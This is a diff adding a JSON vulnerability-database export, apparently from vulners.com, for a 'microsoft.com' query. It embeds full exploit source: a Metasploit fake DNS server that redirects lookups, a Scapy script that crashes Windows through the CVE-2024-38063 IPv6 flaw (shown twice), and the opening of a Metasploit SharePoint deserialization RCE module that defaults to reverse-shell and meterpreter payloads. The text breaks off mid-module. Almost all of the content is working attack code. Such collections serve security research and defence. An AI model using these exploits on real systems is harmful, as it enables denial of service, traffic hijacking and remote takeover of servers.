@@ -1,0 +1,445 @@
+{
+    "query": {
+        "query": "microsoft.com",
+        "type": "bugbounty",
+        "status": "unpatched"
+    },
+    "vulnerabilities": [
+        {
+            "lastseen": "2024-08-31T21:27:41",
+            "description": "",
+            "published": "2024-08-31T00:00:00",
+            "type": "packetstorm",
+            "title": "Fake DNS Service",
+            "bulletinFamily": "exploit",
+            "cvelist": [],
+            "modified": "2024-08-31T00:00:00",
+            "id": "PACKETSTORM:180740",
+            "href": "https://packetstormsecurity.com/files/180740/Fake-DNS-Service.html",
+            "sourceData": "`##  \n# This module requires Metasploit: https://metasploit.com/download  \n# Current source: https://github.com/rapid7/metasploit-framework  \n##  \n  \nrequire 'resolv'  \n  \nclass MetasploitModule < Msf::Auxiliary  \ninclude Msf::Auxiliary::Report  \n  \n  \ndef initialize  \nsuper(  \n'Name' => 'Fake DNS Service',  \n'Description' => %q{  \nThis module provides a DNS service that redirects  \nall queries to a particular address.  \n},  \n'Author' => ['ddz', 'hdm', 'fozavci'],  \n'License' => MSF_LICENSE,  \n'Actions' =>  \n[  \n[ 'Service', 'Description' => 'Run DNS server' ]  \n],  \n'PassiveActions' =>  \n[  \n'Service'  \n],  \n'DefaultAction' => 'Service'  \n)  \n  \nregister_options(  \n[  \nOptAddress.new('SRVHOST', [ true, \"The local host to listen on.\", '0.0.0.0' ]),  \nOptPort.new('SRVPORT', [ true, \"The local port to listen on.\", 53 ]),  \nOptAddress.new('TARGETHOST', [ false, \"The address that all names should resolve to\", nil ]),  \nOptString.new('TARGETDOMAIN', [ true, \"The list of target domain names we want to fully resolve (BYPASS) or fake resolve (FAKE). Use '*' for wildcard.\", 'www.google.com']),  \nOptEnum.new('TARGETACTION', [ true, \"Action for TARGETDOMAIN\", \"BYPASS\", %w{FAKE BYPASS}]),  \n])  \n  \nregister_advanced_options(  \n[  \nOptPort.new('RR_SRV_PORT', [ false, \"The port field in the SRV response when FAKE\", 5060]),  \nOptBool.new('LogConsole', [ false, \"Determines whether to log all request to the console\", true]),  \nOptBool.new('LogDatabase', [ false, \"Determines whether to log all request to the database\", false]),  \n])  \nend  \n  \n  \ndef target_host(addr = nil)  \ntarget = datastore['TARGETHOST']  \nif target.blank?  \nif addr  \n::Rex::Socket.source_address(addr)  \nelse  \nnil  \nend  \nelse  \n::Rex::Socket.resolv_to_dotted(target)  \nend  \nend  \n  \ndef run  \n@port = datastore['SRVPORT'].to_i  \n  \n@log_console = false  \n@log_database = false  \n  \nif datastore['LogConsole']  \n@log_console = true  \nend  \n  \nif datastore['LogDatabase']  \n@log_database = true  \nend  \n  \n# MacOS X workaround  \n::Socket.do_not_reverse_lookup = true  \n  \nprint_status(\"DNS server initializing\")  \n@sock = ::UDPSocket.new()  \n@sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)  \n@sock.bind(datastore['SRVHOST'], @port)  \n@run = true  \n@domain_target_list = datastore['TARGETDOMAIN'].split  \n@bypass = ( datastore['TARGETACTION'].upcase == \"BYPASS\" )  \n  \nprint_status(\"DNS server started\")  \nbegin  \n  \nwhile @run  \n@error_resolving = false  \npacket, addr = @sock.recvfrom(65535)  \nsrc_addr = addr[3]  \n@requestor = addr  \nnext if packet.length == 0  \n  \nrequest = Resolv::DNS::Message.decode(packet)  \nnext unless request.qr == 0  \n  \n#  \n# XXX: Track request IDs by requesting IP address and port  \n#  \n# Windows XP SP1a: UDP source port constant,  \n# sequential IDs since boot time  \n# Windows XP SP2: Randomized IDs  \n#  \n# Debian 3.1: Static source port (32906) until timeout,  \n# randomized IDs  \n#  \n  \nlst = []  \n  \nrequest.each_question {|name, typeclass|  \n# Identify potential domain exceptions  \n@match_target = false  \n@match_name = name.to_s  \n@domain_target_list.each do |ex|  \nescaped = Regexp.escape(ex).gsub('\\*','.*?')  \nregex = Regexp.new \"^#{escaped}$\", Regexp::IGNORECASE  \nif ( name.to_s =~ regex )  \n@match_target = true  \n@match_name = ex  \nend  \nend  \n  \ntc_s = typeclass.to_s().gsub(/^Resolv::DNS::Resource::/, \"\")  \n  \nrequest.qr = 1  \nrequest.ra = 1  \n  \nlst << \"#{tc_s} #{name}\"  \ncase tc_s  \nwhen 'IN::A'  \n  \n# Special fingerprinting name lookups:  \n#  \n# _isatap -> XP SP = 0  \n# isatap.localdomain -> XP SP >= 1  \n# teredo.ipv6.microsoft.com -> XP SP >= 2  \n#  \n# time.windows.com -> windows ???  \n# wpad.localdomain -> windows ???  \n#  \n# <hostname> SOA -> windows XP self hostname lookup  \n#  \n  \nanswer = Resolv::DNS::Resource::IN::A.new(target_host(src_addr))  \n  \nif (@match_target and not @bypass) or (not @match_target and @bypass)  \n# Resolve FAKE response  \nif (@log_console)  \nprint_status(\"DNS target domain #{@match_name} found; Returning fake A records for #{name}\")  \nend  \nelse  \n# Resolve the exception domain  \nbegin  \nip = Resolv::DNS.new().getaddress(name).to_s  \nanswer = Resolv::DNS::Resource::IN::A.new( ip )  \nrescue ::Exception => e  \n@error_resolving = true  \nnext  \nend  \nif (@log_console)  \nprint_status(\"DNS bypass domain #{@match_name} found; Returning real A records for #{name}\")  \nend  \nend  \n  \n  \nrequest.add_answer(name, 60, answer)  \n  \nwhen 'IN::MX'  \nmx = Resolv::DNS::Resource::IN::MX.new(10, Resolv::DNS::Name.create(\"mail.#{name}\"))  \nns = Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create(\"dns.#{name}\"))  \nar = Resolv::DNS::Resource::IN::A.new(target_host(src_addr))  \nrequest.add_answer(name, 60, mx)  \nrequest.add_authority(name, 60, ns)  \nrequest.add_additional(Resolv::DNS::Name.create(\"mail.#{name}\"), 60, ar)  \n  \nwhen 'IN::NS'  \nns = Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create(\"dns.#{name}\"))  \nar = Resolv::DNS::Resource::IN::A.new(target_host(src_addr))  \nrequest.add_answer(name, 60, ns)  \nrequest.add_additional(name, 60, ar)  \n  \nwhen 'IN::SRV'  \nif @bypass || !@match_target  \nif @log_console  \nprint_status(\"DNS bypass domain #{@match_name} found; Returning real SRV records for #{name}\")  \nend  \n# if we are in bypass mode or we are in fake mode but the target didn't match,  \n# just return the real response RRs  \nresources = Resolv::DNS.new().getresources(Resolv::DNS::Name.create(name), Resolv::DNS::Resource::IN::SRV)  \nif resources.empty?  \n@error_resolving = true  \nprint_error(\"Unable to resolve SRV record for #{name} -- skipping\")  \nnext  \nend  \nresources.each do |resource|  \nhost = resource.target  \nport = resource.port.to_i  \nweight = resource.weight.to_i  \npriority = resource.priority.to_i  \nttl = resource.ttl.to_i  \nrequest.add_answer(  \nname,  \nttl,  \nResolv::DNS::Resource::IN::SRV.new(priority, weight, port, Resolv::DNS::Name.create(host))  \n)  \nend  \nelse  \nif @log_console  \nprint_status(\"DNS target domain #{@match_name} found; Returning fake SRV records for #{name}\")  \n# Prepare the FAKE response  \nrequest.add_answer(  \nname,  \n10,  \nResolv::DNS::Resource::IN::SRV.new(5, 0, datastore['RR_SRV_PORT'], Resolv::DNS::Name.create(name))  \n)  \nrequest.add_additional(Resolv::DNS::Name.create(name), 60, Resolv::DNS::Resource::IN::A.new(target_host(src_addr)))  \nend  \nend  \nwhen 'IN::PTR'  \nsoa = Resolv::DNS::Resource::IN::SOA.new(  \nResolv::DNS::Name.create(\"ns.internet.com\"),  \nResolv::DNS::Name.create(\"root.internet.com\"),  \n1,  \n3600,  \n3600,  \n3600,  \n3600  \n)  \nans = Resolv::DNS::Resource::IN::PTR.new(  \nResolv::DNS::Name.create(\"www\")  \n)  \n  \nrequest.add_answer(name, 60, ans)  \nrequest.add_authority(name, 60, soa)  \nelse  \nlst << \"UNKNOWN #{tc_s}\"  \nend  \n}  \n  \nif(@log_console)  \nif(@error_resolving)  \nprint_error(\"XID #{request.id} (#{lst.join(\", \")}) - Error resolving\")  \nelse  \nprint_status(\"XID #{request.id} (#{lst.join(\", \")})\")  \nend  \nend  \n  \nif(@log_database)  \nreport_note(  \n:host => addr[3],  \n:type => \"dns_lookup\",  \n:data => \"#{addr[3]}:#{addr[1]} XID #{request.id} (#{lst.join(\", \")})\"  \n) if lst.length > 0  \nend  \n  \n  \n@sock.send(request.encode(), 0, addr[3], addr[1])  \nend  \n  \nrescue ::Exception => e  \nprint_error(\"fakedns: #{e.class} #{e} #{e.backtrace}\")  \n# Make sure the socket gets closed on exit  \nensure  \n@sock.close  \nend  \nend  \n  \ndef print_error(msg)  \n@requestor ? super(\"%s:%p - DNS - %s\" % [@requestor[3], @requestor[1], msg]) : super(msg)  \nend  \n  \ndef print_status(msg)  \n@requestor ? super(\"%s:%p - DNS - %s\" % [@requestor[3], @requestor[1], msg]) : super(msg)  \nend  \nend  \n`\n",
+            "cvss": {
+                "score": 0.0,
+                "severity": "NONE",
+                "version": "NONE",
+                "vector": "NONE"
+            },
+            "sourceHref": "https://packetstormsecurity.com/files/download/180740/fakedns.rb.txt",
+            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:180740"
+        },
+        {
+            "lastseen": "2024-08-29T14:55:15",
+            "description": "",
+            "published": "2024-08-29T00:00:00",
+            "type": "packetstorm",
+            "title": "Microsoft Windows IPv6 CVE-2024-38063 Checker / Denial Of Service",
+            "bulletinFamily": "exploit",
+            "cvelist": [
+                "CVE-2024-38063"
+            ],
+            "modified": "2024-08-29T00:00:00",
+            "id": "PACKETSTORM:180458",
+            "href": "https://packetstormsecurity.com/files/180458/Microsoft-Windows-IPv6-CVE-2024-38063-Checker-Denial-Of-Service.html",
+            "sourceData": "`#!/usr/bin/env python3  \n# -*- coding: utf-8 -*-  \n  \n# Exploit Title: Windows IPv6 CVE-2024-38063 Checker and Denial-Of-Service  \n# Date: 2024-08-07  \n# Exploit Author: Photubias  \n# Vendor Homepage: https://microsoft.com  \n# Vendor Advisory: [1] https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38063  \n# Version: Windows 10, 11 <10.0.26100.1457 and Server 2016-2019-2022 <10.0.17763.6189  \n# Tested on: Windows 11 23H2 and Windows Server 2022  \n# CVE: CVE-2024-38063  \n  \nimport os, subprocess, re, time, sys  \n  \n## Variables  \nsDstIP = 'fe80::78b7:6283:49ad:c565' ## Placeholder  \nif len(sys.argv) > 1: sDstIP = sys.argv[1] ## Please provide an argument  \nsDstMAC = '00:0C:29:55:E1:C8' ## Not required, will try to get the MAC via Neighbor Discovery  \niBatches = 20  \niCorruptions = 20 ## How many times do we want to corrupt the tcpip.sys memory per batch  \n  \ntry:  \nprint('--- Loading Scapy, might take some time ...')  \nfrom scapy.config import conf  \nconf.ipv6_enabled = False  \nimport scapy.all as scapy  \nscapy.conf.verb = 0  \nexcept:  \nprint('Error while loading scapy, please run \"pip install scapy\"')  \nexit(1)  \n  \nimport logging  \nlogging.getLogger('scapy.runtime').setLevel(logging.ERROR)  \n  \ndef selectInterface(): #adapter[] = npfdevice, ip, mac  \ndef getAllInterfaces():   \nlstInterfaces=[]  \nif os.name == 'nt':  \nproc = subprocess.Popen('getmac /NH /V /FO csv | FINDSTR /V /I disconnected', shell=True, stdout=subprocess.PIPE)  \nfor bInterface in proc.stdout.readlines():  \nlstInt = bInterface.split(b',')  \nsAdapter = lstInt[0].strip(b'\"').decode()  \nsDevicename = lstInt[1].strip(b'\"').decode()  \nsMAC = lstInt[2].strip(b'\"').decode().lower().replace('-', ':')  \nsWinguID = lstInt[3].strip().strip(b'\"').decode()[-38:]  \nproc = subprocess.Popen('netsh int ipv6 show addr \"{}\" | FINDSTR /I Address'.format(sAdapter), shell=True, stdout=subprocess.PIPE)  \ntry: sIP = re.findall(r'[\\w:]+:+[\\w:]+', proc.stdout.readlines()[0].strip().decode())[0]  \nexcept: sIP = ''  \nif len(sMAC) == 17: lstInterfaces.append([sAdapter, sIP, sMAC, sDevicename, sWinguID]) # When no or bad MAC address (e.g. PPP adapter), do not add  \nelse:  \nproc = subprocess.Popen('for i in $(ip address | grep -v \"lo\" | grep \"default\" | cut -d\":\" -f2 | cut -d\" \" -f2);do echo $i $(ip address show dev $i | grep \"inet6 \" | cut -d\" \" -f6 | cut -d\"/\" -f1) $(ip address show dev $i | grep \"ether\" | cut -d\" \" -f6);done', shell=True, stdout=subprocess.PIPE)  \nfor bInterface in proc.stdout.readlines():  \nlstInt = bInterface.strip().split(b' ')  \ntry:   \nif len(lstInt[2]) == 17: lstInterfaces.append([lstInt[0].decode(), lstInt[1].decode(), lstInt[2].decode(), '', ''])  \nexcept: pass  \nreturn lstInterfaces  \n  \nlstInterfaces = getAllInterfaces()  \nif len(lstInterfaces) > 1:  \ni = 1  \nfor lstInt in lstInterfaces: #array of arrays: adapter, ip, mac, windows devicename, windows guID  \nprint('[{}] {} has {} ({})'.format(i, lstInt[2], lstInt[1], lstInt[0]))  \ni += 1  \n#sAnswer = input('[?] Please select the adapter [1]: ')  \nsAnswer='3'  \nelse: sAnswer = None  \nif not sAnswer or sAnswer == '' or not sAnswer.isdigit() or int(sAnswer) >= i: sAnswer = 1  \niAnswer = int(sAnswer) - 1  \nsNPF = lstInterfaces[iAnswer][0]  \nsIP = lstInterfaces[iAnswer][1]  \nsMAC = lstInterfaces[iAnswer][2]  \nif os.name == 'nt': sNPF = r'\\Device\\NPF_' + lstInterfaces[iAnswer][4]  \nreturn (sNPF, sIP, sMAC, lstInterfaces[iAnswer][3])  \n  \ndef get_packets(iID, sDstIPv6, sDstMac=None):  \niFragID = 0xbedead00 + iID  \noPacket1 = scapy.IPv6(fl=1, hlim=64+iID, dst=sDstIPv6) / scapy.IPv6ExtHdrDestOpt(options=[scapy.PadN(otype=0x81, optdata='bad')])  \noPacket2 = scapy.IPv6(fl=1, hlim=64+iID, dst=sDstIPv6) / scapy.IPv6ExtHdrFragment(id=iFragID, m = 1, offset = 0) / 'notalive'  \noPacket3 = scapy.IPv6(fl=1, hlim=64+iID, dst=sDstIPv6) / scapy.IPv6ExtHdrFragment(id=iFragID, m = 0, offset = 1)  \nif sDstMac: ## Should always be this, it seems sending to 'ff:ff:ff:ff:ff:ff' does not work  \noPacket1 = scapy.Ether(dst=sDstMac) / oPacket1  \noPacket2 = scapy.Ether(dst=sDstMac) / oPacket2  \noPacket3 = scapy.Ether(dst=sDstMac) / oPacket3  \nreturn [oPacket1, oPacket2, oPacket3]  \n  \ndef doIPv6ND(sDstIP, sInt): ## Try to get a MAC address via IPv6 Neighbour Sollicitation  \nsMACResp = None  \noNeighborSollicitation = scapy.IPv6(dst=sDstIP) / scapy.ICMPv6ND_NS(tgt=sDstIP) / scapy.ICMPv6NDOptSrcLLAddr(lladdr='ff:ff:ff:ff:ff:ff')  \noResponse = scapy.sr1(oNeighborSollicitation, timeout=5, iface=sInt)  \nif oResponse and scapy.ICMPv6NDOptDstLLAddr in oResponse:  \nsMACResp = oResponse[scapy.ICMPv6NDOptDstLLAddr].lladdr  \nreturn sMACResp  \n  \nlstInt = selectInterface() ## NPF, IPv6, MAC, Name  \n  \nsMAC = doIPv6ND(sDstIP, lstInt[0])  \nif sMAC:   \nprint(f'[+] Target {sDstIP} is reachable, got MAC Address {sMAC}')  \nsDstMAC = sMAC  \nelif sDstMAC != '':  \nprint('[-] Target not responding to Neighbor Sollicitation Packets, using the provided MAC {}'.format(sDstMAC))  \nelse:   \nprint('[-] Without a MAC address, this exploit will probably not work')  \n  \nlstPacketsToSend = []  \nfor i in range(iBatches):  \nfor j in range(iCorruptions):  \nlstPacketsToSend += get_packets(j, sDstIP, sDstMAC) + get_packets(j, sDstIP, sDstMAC)  \n  \n## 'send' is Layer3 (let scapy figure out the MAC address), 'sendp' is L2 (MAC address is filled in, much better)  \nprint('[i] Verifying vulnerability against IPv6 address {}'.format(sDstIP))  \n## Verification first: \"ICMPv6ParamProblem\"  \nlstResp = scapy.srp1(lstPacketsToSend[0], iface=lstInt[0], timeout=5)  \nif lstResp and scapy.IPv6 in lstResp[0] and scapy.ICMPv6ParamProblem in lstResp[0]:   \nprint('[+] Yes, {} is vulnerable and exploitable for CVE-2024-38063'.format(sDstIP))  \nelse:   \ninput('[-] Not vulnerable or firewall is enabled. Please verify and rerun or press enter to continue')  \nprint('[i] Waiting 10 seconds to let the target cool down (more is better)')  \ntime.sleep(10)  \ninput('[?] OK, continue to execute the Denial Of Service (BSOD)? Press Ctrl+C to cancel now')  \n########## Exploit  \nprint('[+] Sending {} packets now via interface {} {}'.format(len(lstPacketsToSend), lstInt[0], lstInt[3]))  \nscapy.conf.verb = 1  \nscapy.sendp(lstPacketsToSend, iface=lstInt[0])  \nprint('[+] All packets are sent, now it takes *exactly* 60 seconds for the target to crash')  \n  \n  \n`\n",
+            "cvss": {
+                "score": 9.8,
+                "severity": "CRITICAL",
+                "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                "version": "3.1"
+            },
+            "sourceHref": "https://packetstormsecurity.com/files/download/180458/CVE-2024-38063-dos.py.txt",
+            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:180458"
+        },
+        {
+            "lastseen": "2024-08-30T01:20:43",
+            "description": "",
+            "published": "2024-08-28T00:00:00",
+            "type": "exploitdb",
+            "title": "Windows TCP/IP - RCE Checker and Denial of Service",
+            "bulletinFamily": "exploit",
+            "cvelist": [
+                "CVE-2024-38063"
+            ],
+            "modified": "2024-08-28T00:00:00",
+            "id": "EDB-ID:52075",
+            "href": "https://www.exploit-db.com/exploits/52075",
+            "sourceData": "#!/usr/bin/env python3\r\n# -*- coding: utf-8 -*-\r\n\r\n# Exploit Title: Windows IPv6 CVE-2024-38063 Checker and Denial-Of-Service\r\n# Date: 2024-08-07\r\n# Exploit Author: Photubias\r\n# Vendor Homepage: https://microsoft.com\r\n# Vendor Advisory: [1] https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38063\r\n# Version: Windows 10, 11 <10.0.26100.1457 and Server 2016-2019-2022 <10.0.17763.6189\r\n# Tested on: Windows 11 23H2 and Windows Server 2022\r\n# CVE: CVE-2024-38063\r\n\r\nimport os, subprocess, re, time, sys\r\n\r\n## Variables\r\nsDstIP = 'fe80::78b7:6283:49ad:c565'        ## Placeholder\r\nif len(sys.argv) > 1: sDstIP = sys.argv[1]  ## Please provide an argument\r\nsDstMAC = '00:0C:29:55:E1:C8'               ## Not required, will try to get the MAC via Neighbor Discovery\r\niBatches = 20\r\niCorruptions = 20                           ## How many times do we want to corrupt the tcpip.sys memory per batch\r\n\r\ntry:\r\n    print('--- Loading Scapy, might take some time ...')\r\n    from scapy.config import conf\r\n    conf.ipv6_enabled = False\r\n    import scapy.all as scapy\r\n    scapy.conf.verb = 0\r\nexcept:\r\n    print('Error while loading scapy, please run \"pip install scapy\"')\r\n    exit(1)\r\n\r\nimport logging\r\nlogging.getLogger('scapy.runtime').setLevel(logging.ERROR)\r\n\r\ndef selectInterface(): #adapter[] = npfdevice, ip, mac\r\n    def getAllInterfaces(): \r\n        lstInterfaces=[]\r\n        if os.name == 'nt':\r\n            proc = subprocess.Popen('getmac /NH /V /FO csv | FINDSTR /V /I disconnected', shell=True, stdout=subprocess.PIPE)\r\n            for bInterface in proc.stdout.readlines():\r\n                lstInt = bInterface.split(b',')\r\n                sAdapter = lstInt[0].strip(b'\"').decode()\r\n                sDevicename = lstInt[1].strip(b'\"').decode()\r\n                sMAC = lstInt[2].strip(b'\"').decode().lower().replace('-', ':')\r\n                sWinguID = lstInt[3].strip().strip(b'\"').decode()[-38:]\r\n                proc = subprocess.Popen('netsh int ipv6 show addr \"{}\" | FINDSTR /I Address'.format(sAdapter), shell=True, stdout=subprocess.PIPE)\r\n                try: sIP = re.findall(r'[\\w:]+:+[\\w:]+', proc.stdout.readlines()[0].strip().decode())[0]\r\n                except: sIP = ''\r\n                if len(sMAC) == 17: lstInterfaces.append([sAdapter, sIP, sMAC, sDevicename, sWinguID]) # When no or bad MAC address (e.g. PPP adapter), do not add\r\n        else:\r\n            proc = subprocess.Popen('for i in $(ip address | grep -v \"lo\" | grep \"default\" | cut -d\":\" -f2 | cut -d\" \" -f2);do echo $i $(ip address show dev $i | grep \"inet6 \" | cut -d\" \" -f6 | cut -d\"/\" -f1) $(ip address show dev $i | grep \"ether\" | cut -d\" \" -f6);done', shell=True, stdout=subprocess.PIPE)\r\n            for bInterface in proc.stdout.readlines():\r\n                lstInt = bInterface.strip().split(b' ')\r\n                try: \r\n                    if len(lstInt[2]) == 17: lstInterfaces.append([lstInt[0].decode(), lstInt[1].decode(), lstInt[2].decode(), '', ''])\r\n                except: pass\r\n        return lstInterfaces\r\n    \r\n    lstInterfaces = getAllInterfaces()\r\n    if len(lstInterfaces) > 1:\r\n        i = 1\r\n        for lstInt in lstInterfaces: #array of arrays: adapter, ip, mac, windows devicename, windows guID\r\n            print('[{}] {} has {} ({})'.format(i, lstInt[2], lstInt[1], lstInt[0]))\r\n            i += 1\r\n        #sAnswer = input('[?] Please select the adapter [1]: ')\r\n        sAnswer='3'\r\n    else: sAnswer = None\r\n    if not sAnswer or sAnswer == '' or not sAnswer.isdigit() or int(sAnswer) >= i: sAnswer = 1\r\n    iAnswer = int(sAnswer) - 1\r\n    sNPF = lstInterfaces[iAnswer][0]\r\n    sIP = lstInterfaces[iAnswer][1]\r\n    sMAC = lstInterfaces[iAnswer][2]\r\n    if os.name == 'nt': sNPF = r'\\Device\\NPF_' + lstInterfaces[iAnswer][4]\r\n    return (sNPF, sIP, sMAC, lstInterfaces[iAnswer][3])\r\n\r\ndef get_packets(iID, sDstIPv6, sDstMac=None):\r\n    iFragID = 0xbedead00 + iID\r\n    oPacket1 = scapy.IPv6(fl=1, hlim=64+iID, dst=sDstIPv6) / scapy.IPv6ExtHdrDestOpt(options=[scapy.PadN(otype=0x81, optdata='bad')])\r\n    oPacket2 = scapy.IPv6(fl=1, hlim=64+iID, dst=sDstIPv6) / scapy.IPv6ExtHdrFragment(id=iFragID, m = 1, offset = 0) / 'notalive'\r\n    oPacket3 = scapy.IPv6(fl=1, hlim=64+iID, dst=sDstIPv6) / scapy.IPv6ExtHdrFragment(id=iFragID, m = 0, offset = 1)\r\n    if sDstMac: ## Should always be this, it seems sending to 'ff:ff:ff:ff:ff:ff' does not work\r\n        oPacket1 = scapy.Ether(dst=sDstMac) / oPacket1\r\n        oPacket2 = scapy.Ether(dst=sDstMac) / oPacket2\r\n        oPacket3 = scapy.Ether(dst=sDstMac) / oPacket3\r\n    return [oPacket1, oPacket2, oPacket3]\r\n\r\ndef doIPv6ND(sDstIP, sInt): ## Try to get a MAC address via IPv6 Neighbour Sollicitation\r\n    sMACResp = None\r\n    oNeighborSollicitation = scapy.IPv6(dst=sDstIP) / scapy.ICMPv6ND_NS(tgt=sDstIP) / scapy.ICMPv6NDOptSrcLLAddr(lladdr='ff:ff:ff:ff:ff:ff')\r\n    oResponse = scapy.sr1(oNeighborSollicitation, timeout=5, iface=sInt)\r\n    if oResponse and scapy.ICMPv6NDOptDstLLAddr in oResponse:\r\n        sMACResp = oResponse[scapy.ICMPv6NDOptDstLLAddr].lladdr\r\n    return sMACResp\r\n\r\nlstInt = selectInterface() ## NPF, IPv6, MAC, Name\r\n\r\nsMAC = doIPv6ND(sDstIP, lstInt[0])\r\nif sMAC: \r\n    print(f'[+] Target {sDstIP} is reachable, got MAC Address {sMAC}')\r\n    sDstMAC = sMAC\r\nelif sDstMAC != '':\r\n    print('[-] Target not responding to Neighbor Sollicitation Packets, using the provided MAC {}'.format(sDstMAC))\r\nelse: \r\n    print('[-] Without a MAC address, this exploit will probably not work')\r\n\r\nlstPacketsToSend = []\r\nfor i in range(iBatches):\r\n    for j in range(iCorruptions):\r\n        lstPacketsToSend += get_packets(j, sDstIP, sDstMAC) + get_packets(j, sDstIP, sDstMAC)\r\n\r\n## 'send' is Layer3 (let scapy figure out the MAC address), 'sendp' is L2 (MAC address is filled in, much better)\r\nprint('[i] Verifying vulnerability against IPv6 address {}'.format(sDstIP))\r\n## Verification first: \"ICMPv6ParamProblem\"\r\nlstResp = scapy.srp1(lstPacketsToSend[0], iface=lstInt[0], timeout=5)\r\nif lstResp and scapy.IPv6 in lstResp[0] and scapy.ICMPv6ParamProblem in lstResp[0]: \r\n    print('[+] Yes, {} is vulnerable and exploitable for CVE-2024-38063'.format(sDstIP))\r\nelse: \r\n    input('[-] Not vulnerable or firewall is enabled. Please verify and rerun or press enter to continue')\r\nprint('[i] Waiting 10 seconds to let the target cool down (more is better)')\r\ntime.sleep(10)\r\ninput('[?] OK, continue to execute the Denial Of Service (BSOD)? Press Ctrl+C to cancel now')\r\n########## Exploit\r\nprint('[+] Sending {} packets now via interface {} {}'.format(len(lstPacketsToSend), lstInt[0], lstInt[3]))\r\nscapy.conf.verb = 1\r\nscapy.sendp(lstPacketsToSend, iface=lstInt[0])\r\nprint('[+] All packets are sent, now it takes *exactly* 60 seconds for the target to crash')",
+            "cvss": {
+                "score": 9.8,
+                "severity": "CRITICAL",
+                "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                "version": "3.1"
+            },
+            "sourceHref": "https://www.exploit-db.com/raw/52075",
+            "vhref": "https://vulners.com/exploitdb/EDB-ID:52075"
+        },
+        {
+            "lastseen": "2024-07-25T15:11:10",
+            "description": "The EditingPageParser.VerifyControlOnSafeList method fails to properly validate user supplied data. This can be leveraged by an attacker to leak sensitive information in rendered-preview content. This module will leak the ViewState validation key and then use it to sign a crafted object that will trigger code execution when deserialized. Tested against SharePoint 2019 and SharePoint 2016, both on Windows Server 2016.\n",
+            "published": "2021-06-07T17:37:28",
+            "type": "metasploit",
+            "title": "Microsoft SharePoint Unsafe Control and ViewState RCE",
+            "bulletinFamily": "exploit",
+            "cvelist": [
+                "CVE-2021-31181"
+            ],
+            "modified": "2024-07-24T15:47:17",
+            "id": "MSF:EXPLOIT-WINDOWS-HTTP-SHAREPOINT_UNSAFE_CONTROL-",
+            "href": "https://www.rapid7.com/db/modules/exploit/windows/http/sharepoint_unsafe_control/",
+            "sourceData": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::Sharepoint\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n\n  XML_NS = {\n    'wpp' => 'http://microsoft.com/sharepoint/webpartpages',\n    'soap' => 'http://www.w3.org/2003/05/soap-envelope',\n    'xsi' => 'http://www.w3.org/2001/XMLSchema-instance',\n    'xsd' => 'http://www.w3.org/2001/XMLSchema'\n  }.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft SharePoint Unsafe Control and ViewState RCE',\n        'Description' => %q{\n          The EditingPageParser.VerifyControlOnSafeList method fails to properly validate user supplied data. This\n          can be leveraged by an attacker to leak sensitive information in rendered-preview content. This module will\n          leak the ViewState validation key and then use it to sign a crafted object that will trigger code execution\n          when deserialized.\n\n          Tested against SharePoint 2019 and SharePoint 2016, both on Windows Server 2016.\n        },\n        'Author' => [\n          'Unknown', # Reported to HP ZDI team, Vulnerability discovery\n          'Spencer McIntyre', # Module\n          'wvu' # Module\n        ],\n        'References' => [\n          [ 'CVE', '2021-31181' ],\n          [ 'ZDI', '21-573' ],\n          [ 'URL', 'https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability' ]\n        ],\n        'DisclosureDate' => '2021-05-11',\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'Arch' => ARCH_CMD,\n              'Type' => :win_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :win_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => :psh_invokewebrequest,\n                'PAYLOAD' => 'windows/x64/meterpreter_reverse_https'\n              }\n            }\n          ],\n          [\n            'PowerShell Stager',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :psh_stager,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_https'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 2,\n        'DefaultOptions' => {\n          'DotNetGadgetChain' => :TypeConfuseDelegate\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptString.new('VALIDATION_KEY', [false, 'ViewState validation key']),\n      OptString.new('COOKIE', [false, 'SharePoint cookie if you have one']),\n      OptString.new('SP_LIST', [true, 'SharePoint site SPList', 'Documents']),\n      # \"Promote\" these advanced options so we don't have to pass around our own\n      OptString.new('HttpUsername', [false, 'SharePoint username']),\n      OptString.new('HttpPassword', [false, 'SharePoint password'])\n    ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def username\n    datastore['HttpUsername']\n  end\n\n  def password\n    datastore['HttpPassword']\n  end\n\n  def cookie\n    datastore['COOKIE']\n  end\n\n  def vuln_builds\n    # https://docs.microsoft.com/en-us/officeupdates/sharepoint-updates\n    # https://buildnumbers.wordpress.com/sharepoint/\n    # Patched in May of 2021\n  